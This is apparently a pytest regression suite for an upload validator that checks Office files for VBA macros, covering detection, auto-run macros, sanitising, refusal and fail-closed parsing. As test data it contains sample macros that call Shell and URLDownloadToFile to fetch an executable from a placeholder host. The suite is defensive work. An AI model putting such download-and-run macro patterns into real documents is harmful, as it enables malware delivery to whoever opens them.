"""The macro check must run against real macro-bearing Office files.

Regression for #860. `_analyze_office_macros` imported a module-level
`detect_vba_macros` that oletools 0.60.2 does not have. The import always
failed, so every Office Open XML upload got only a LOW "macro_check_skipped"
notice and no macro was ever detected. These tests use real VBA projects
written by `tests/vba_fixtures.py`, not stubs.
"""

import io
import zipfile
from types import SimpleNamespace

import pytest
from fastapi import HTTPException, UploadFile

from src.api.education import _shared
from src.security.document_validator import DocumentValidator, ThreatLevel
from tests.vba_fixtures import ooxml_with_vba, vba_project_bin

BENIGN = "Sub Hello()\r\n  MsgBox 1\r\nEnd Sub"
SUSPICIOUS = [
    'Sub Run()\r\n  Shell("calc.exe")\r\nEnd Sub',
    'Sub Get()\r\n  URLDownloadToFile 0, "http://example.test/a", "a.exe", 0, 0\r\n'
    "End Sub",
]


@pytest.fixture(scope="session", autouse=True)
def setup_test_database():
    """These tests use an in-memory session and never initialize a database."""
    yield


class MemorySession:
    def __init__(self):
        self.added = []

    def add(self, value):
        self.added.append(value)

    def commit(self):
        pass


@pytest.fixture
def session(monkeypatch):
    monkeypatch.setattr(
        "src.config.settings.get_settings",
        lambda: SimpleNamespace(env="test", max_file_size_pdf=10 * 1024 * 1024),
    )
    return MemorySession()


def categories(result):
    return {f.category for f in result.findings}


def names(content):
    with zipfile.ZipFile(io.BytesIO(content)) as zf:
        return zf.namelist()


def upload(content, filename):
    return UploadFile(filename=filename, file=io.BytesIO(content))


@pytest.mark.asyncio
@pytest.mark.parametrize("filename,prefix", [("a.docx", "word"), ("a.xlsx", "xl")])
async def test_benign_macro_is_detected_as_high(filename, prefix):
    result = await DocumentValidator().validate(
        filename, ooxml_with_vba(BENIGN, prefix=prefix)
    )

    assert result.threat_level == ThreatLevel.HIGH
    assert result.is_safe is False
    assert categories(result) == {"office_macros_detected"}


@pytest.mark.asyncio
@pytest.mark.parametrize("source", SUSPICIOUS)
async def test_macro_with_suspicious_call_is_critical(source):
    result = await DocumentValidator().validate("a.docx", ooxml_with_vba(source))

    assert result.threat_level == ThreatLevel.CRITICAL
    assert categories(result) == {"office_macros_detected", "office_macro_suspicious"}


def plain_docx(extra_parts=None):
    """The macro fixture's package with the VBA project part taken out."""
    with zipfile.ZipFile(io.BytesIO(ooxml_with_vba(BENIGN))) as zf:
        parts = {n: zf.read(n) for n in zf.namelist() if n != "word/vbaProject.bin"}
    parts.update(extra_parts or {})
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    return buffer.getvalue()


def raise_in(monkeypatch, method):
    from oletools.olevba import VBA_Parser

    def boom(self):
        raise RuntimeError("synthetic parser failure")

    monkeypatch.setattr(VBA_Parser, method, boom)


@pytest.mark.asyncio
async def test_document_without_macros_gets_no_macro_finding():
    result = await DocumentValidator().validate("a.docx", plain_docx())

    assert result.findings == []
    assert result.threat_level == ThreatLevel.SAFE
    assert result.is_safe is True


@pytest.mark.asyncio
async def test_legacy_office_macro_is_detected_and_autoexec_is_critical():
    validator = DocumentValidator()

    benign = await validator.validate("a.doc", vba_project_bin(BENIGN))
    auto = await validator.validate(
        "a.doc", vba_project_bin("Sub AutoOpen()\r\n  MsgBox 1\r\nEnd Sub")
    )

    assert benign.threat_level == ThreatLevel.HIGH
    assert categories(benign) == {"office_macros_detected"}
    assert auto.threat_level == ThreatLevel.CRITICAL
    assert "office_macro_autoexec" in categories(auto)


@pytest.mark.asyncio
async def test_upload_with_benign_macro_is_sanitised_and_processed(session):
    original = ooxml_with_vba(BENIGN)

    returned = await _shared.validate_uploaded_file(
        upload(original, "report.docx"), session, "workspace"
    )

    assert "word/vbaProject.bin" in names(original)
    assert "word/vbaProject.bin" not in names(returned)
    record = session.added[0]
    assert record.threat_level == "high"
    assert record.was_sanitized is True
    assert record.was_blocked is False


@pytest.mark.asyncio
@pytest.mark.parametrize("source", SUSPICIOUS)
async def test_upload_with_suspicious_macro_is_refused(session, source):
    with pytest.raises(HTTPException) as caught:
        await _shared.validate_uploaded_file(
            upload(ooxml_with_vba(source), "report.docx"), session, "workspace"
        )

    assert caught.value.status_code == 400
    assert caught.value.detail["threat_level"] == "critical"
    record = session.added[0]
    assert record.threat_level == "critical"
    assert record.was_blocked is True
    assert record.was_sanitized is False


def vba_part_with(binary):
    """A package whose vbaProject.bin part is replaced with the given bytes."""
    with zipfile.ZipFile(io.BytesIO(ooxml_with_vba(BENIGN))) as zf:
        parts = {n: zf.read(n) for n in zf.namelist()}
    parts["word/vbaProject.bin"] = binary
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    return buffer.getvalue()


GOOD_VBA = vba_project_bin(BENIGN)
UNREADABLE_VBA = {
    # oletools raises on these
    "truncated": GOOD_VBA[:700],
    "magic_only": GOOD_VBA[:8] + b"\x00" * 600,
    # oletools reads these without error and finds nothing
    "not_ole": b"not an ole file at all" * 10,
    "zeroed_directory": GOOD_VBA[:512] + b"\x00" * (len(GOOD_VBA) - 512),
}


@pytest.mark.asyncio
@pytest.mark.parametrize("kind", sorted(UNREADABLE_VBA))
async def test_unreadable_vba_project_fails_closed_and_is_removed(session, kind):
    original = vba_part_with(UNREADABLE_VBA[kind])

    result = await DocumentValidator().validate("a.docx", original)
    assert categories(result) == {"macro_check_failed"}
    assert result.threat_level == ThreatLevel.HIGH

    returned = await _shared.validate_uploaded_file(
        upload(original, "report.docx"), session, "workspace"
    )
    assert "word/vbaProject.bin" in names(original)
    assert "word/vbaProject.bin" not in names(returned)
    assert session.added[0].was_sanitized is True


@pytest.mark.asyncio
async def test_parser_failure_on_a_file_with_a_vba_part_is_high(monkeypatch):
    raise_in(monkeypatch, "detect_vba_macros")

    result = await DocumentValidator().validate("a.docx", ooxml_with_vba(BENIGN))

    assert categories(result) == {"macro_check_failed"}
    assert result.threat_level == ThreatLevel.HIGH


@pytest.mark.asyncio
async def test_parser_failure_on_a_macro_enabled_package_is_high(monkeypatch):
    raise_in(monkeypatch, "detect_vba_macros")
    macro_enabled = plain_docx(
        {
            "[Content_Types].xml": '<Types><Override PartName="/word/document.xml" '
            'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            "</Types>"
        }
    )

    result = await DocumentValidator().validate("a.docx", macro_enabled)

    assert result.threat_level == ThreatLevel.HIGH


@pytest.mark.asyncio
async def test_parser_failure_without_a_vba_part_keeps_embedded_objects(
    session, monkeypatch
):
    """A parser hiccup on an ordinary document must not strip its objects (#856)."""
    raise_in(monkeypatch, "detect_vba_macros")
    embedding = "word/embeddings/oleObject1.bin"
    original = plain_docx({embedding: b"\xd0\xcf\x11\xe0 synthetic equation"})

    result = await DocumentValidator().validate("a.docx", original)
    assert categories(result) == {"macro_check_failed"}
    assert result.threat_level == ThreatLevel.MEDIUM

    returned = await _shared.validate_uploaded_file(
        upload(original, "report.docx"), session, "workspace"
    )
    assert returned == original
    assert embedding in names(returned)
    assert session.added[0].was_sanitized is False


@pytest.mark.asyncio
async def test_legacy_office_analysis_failure_is_high(monkeypatch):
    raise_in(monkeypatch, "detect_vba_macros")

    result = await DocumentValidator().validate("a.doc", vba_project_bin(BENIGN))

    assert categories(result) == {"macro_check_failed"}
    assert result.threat_level == ThreatLevel.HIGH


@pytest.mark.asyncio
async def test_legacy_office_file_oletools_cannot_open_is_high():
    result = await DocumentValidator().validate("a.doc", GOOD_VBA[:8] + b"\x00" * 600)

    assert categories(result) == {"macro_check_failed"}
    assert result.threat_level == ThreatLevel.HIGH


@pytest.mark.asyncio
async def test_unreadable_macro_code_is_reported_beside_the_macro_finding(
    monkeypatch,
):
    raise_in(monkeypatch, "extract_macros")

    result = await DocumentValidator().validate("a.docx", ooxml_with_vba(BENIGN))

    assert categories(result) == {"office_macros_detected", "macro_analysis_failed"}
    assert result.threat_level == ThreatLevel.HIGH


@pytest.mark.asyncio
async def test_parser_is_closed_after_analysis(monkeypatch):
    from oletools.olevba import VBA_Parser

    closed = []
    original_close = VBA_Parser.close
    monkeypatch.setattr(
        VBA_Parser,
        "close",
        lambda self: (closed.append(self), original_close(self))[1],
    )

    await DocumentValidator().validate("a.docx", ooxml_with_vba(BENIGN))

    # oletools also closes the parsers it opens for the OLE parts inside.
    assert "OpenXML" in {parser.type for parser in closed}
